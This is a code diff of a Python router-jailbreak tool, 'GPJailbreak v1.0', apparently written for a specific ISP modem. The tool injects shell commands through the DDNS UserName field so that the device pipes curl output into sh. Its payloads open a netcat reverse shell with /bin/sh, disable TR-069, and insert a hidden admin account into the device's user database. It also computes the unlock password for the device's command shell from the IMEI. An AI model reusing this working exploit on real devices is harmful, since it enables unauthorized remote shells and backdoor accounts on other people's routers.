@@ -1,5 +1,4 @@
-#!/usr/bin/env python
-import requests, json, re, time, os, sys, threading, base64, hashlib
+import requests, json, re, time, os, sys, threading, base64, hashlib, random
 import http.server
 import socketserver
 
@@ -105,71 +104,94 @@ if(session[0]):
     ddns_clear = {'Service':'Disable','UserName':'','Password':'','HostName':'','Status':'','InternetIpAddress':''}
 
     while(True):
-        print("======================================\n\n\tGPJailbreak v1.0\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Unblock Command Shell \n\t6. Quit\n\n======================================")
+        print("======================================\n\n\tGPJailbreak v1.0\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Add a superadmin account\n\t6. Unblock Command Shell\n\t7. Quit\n\n======================================")
         picker = input("==> ")
         match picker[0]:
             case '1':
                 print("Testing connection, you should see device information:")
                 device_status = session_get(session_token, '/web/v1/setting/deviceinfo', '')
                 if( device_status[0] ):
-                        reqbody = device_status[1]
-                        print(f"Uptime {reqbody["RunningTime"]}")
-                        print(f"Device name {reqbody["HardwareVersion"]}")
-                        print(f"IMEI {reqbody["IMEI"]}")
-                        print(f"SW Ver {reqbody["SoftwareVersion"]}")
+                       reqbody = device_status[1]
+                       print(f"Uptime {reqbody["RunningTime"]}")
+                       print(f"Device name {reqbody["HardwareVersion"]}")
+                       print(f"IMEI {reqbody["IMEI"]}")
+                       print(f"SW Ver {reqbody["SoftwareVersion"]}")
                 else:
-                        print(f"Someting is wrong.... {device_status[1]}")
+                       print(f"Someting is wrong.... {device_status[1]}")
                 input("Done!")
             case '2':
-                 print("Launching Ncat shell...")
-                 payload = ddns_cmd_inject
-                 payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/ncat.sh | sh;"
-                 # Generate payload on the fly to fill LAN ip correctly
-                 payload_sh = open('payloads/ncat.sh', 'w')
-                 payload_sh.write(f'nohup nc -ll -p 6969 {settings_remote_ip} -e /bin/sh >/dev/null 2>&1 &\n')
-                 payload_sh.close()
+                print("Launching Ncat shell...")
+                payload = ddns_cmd_inject
+                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/ncat.sh | sh;"
+                # Generate payload on the fly to fill LAN ip correctly
+                payload_sh = open('payloads/ncat.sh', 'w')
+                payload_sh.write(f'nohup nc -ll -p 6969 {settings_remote_ip} -e /bin/sh >/dev/null 2>&1 &\n')
+                payload_sh.close()
 
-                 result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
-                 if(result1[0]):
-                     print(f"Ncat lisener started at {settings_remote_ip}:6969 !\nStop it by sending kill $(pgrep nc) to the device.")
-                 time.sleep(6)
-                 result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
-                 if(result2[0]):
-                    print("Settings cleanup ok")
-                 input("Done!")
+                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
+                if(result1[0]):
+                    print(f"Ncat lisener started at {settings_remote_ip}:6969 !\nStop it by sending kill $(pgrep nc) to the device.")
+                time.sleep(6)
+                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
+                if(result2[0]):
+                   print("Settings cleanup ok")
+                input("Done!")
             case '3':
-                 print("Starting TR-069 removal...")
-                 payload = ddns_cmd_inject
-                 payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/tr069.sh | sh;"
+                print("Starting TR-069 removal...")
+                payload = ddns_cmd_inject
+                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/tr069.sh | sh;"
 
-                 result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
-                 if(result1[0]):
-                     print(f"TR-069 service has been stopped, disabled and defused. No more ISP spying.")
-                 time.sleep(6)
-                 result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
-                 if(result2[0]):
-                    print("Settings cleanup ok")
-                 input("Done!")
+                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
+                if(result1[0]):
+                    print(f"TR-069 service has been stopped, disabled and defused. No more ISP spying.")
+                time.sleep(6)
+                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
+                if(result2[0]):
+                   print("Settings cleanup ok")
+                input("Done!")
             case '4':
-                 print("TODO")
+                print("TODO")
             case '5':
+                print("Adding new superadmin account...")
+                payload = ddns_cmd_inject
+                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/adduser.sh | sh;"
+
+                username = f"superadmin{random.randint(10, 99)}"
+                userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))
+
+                payload_sh = open('payloads/adduser.sh', 'w')
+                payload_sh.write(f'\n')
+                payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
+                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "delete from users where id=\'69\'"\n')
+                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "INSERT INTO users (\'id\', \'username\', \'password\', \'roletype\', \'firstlogin\') VALUES (69, \'{username}\', \'$passwdmd5\', \'admin\', false);"\n')
+                payload_sh.close()
+
+                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
+                if(result1[0]):
+                    print(f"New super admin account has been added: {username} / {userpassword}\nRunning this function again will re-create new random login.")
+                time.sleep(6)
+                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
+                if(result2[0]):
+                   print("Settings cleanup ok")
+                input("Done!")
+            case '6':
                 print("Unlocking Command Shell...")
                 device_status = session_get(session_token, '/web/v1/setting/deviceinfo', '')
                 if( device_status[0] ):
-                     device_imei = device_status[1]["IMEI"]
-                     imei_b64 =  base64.b64encode(bytes(device_imei,"utf8")).decode("utf-8")
-                     imei_md5 =  hashlib.md5(bytes(device_imei,"utf8")).hexdigest()
-                     shell_password = hashlib.md5( bytes(f"{device_imei}{imei_b64}{imei_md5}","utf8") ).hexdigest()
-                     result = session_post(session_token, 'web/v1/setting/network/cmdshell', {'Command': shell_password,'CommandRunningResults':''} )
-                     if(result[0]):
-                         print(result[1])
-                     else:
-                         print(f"Unlock command failed: {result[1]}")
+                    device_imei = device_status[1]["IMEI"]
+                    imei_b64 =  base64.b64encode(bytes(device_imei,"utf8")).decode("utf-8")
+                    imei_md5 =  hashlib.md5(bytes(device_imei,"utf8")).hexdigest()
+                    shell_password = hashlib.md5( bytes(f"{device_imei}{imei_b64}{imei_md5}","utf8") ).hexdigest()
+                    result = session_post(session_token, 'web/v1/setting/network/cmdshell', {'Command': shell_password,'CommandRunningResults':''} )
+                    if(result[0]):
+                        print(result[1])
+                    else:
+                        print(f"Unlock command failed: {result[1]}")
                 else:
-                    print("Cant get IMEI")
+                   print("Cant get IMEI")
                 input("Done!")
-            case '6':
-                print( "Logging out and existing, bye!" )
+            case '7':
+                print( "Logging out and exiting, bye!" )
                 print( session_post(session_token, 'web/v1/user/logout', '') )
                 payloadserver.stop()
                 sys.exit()
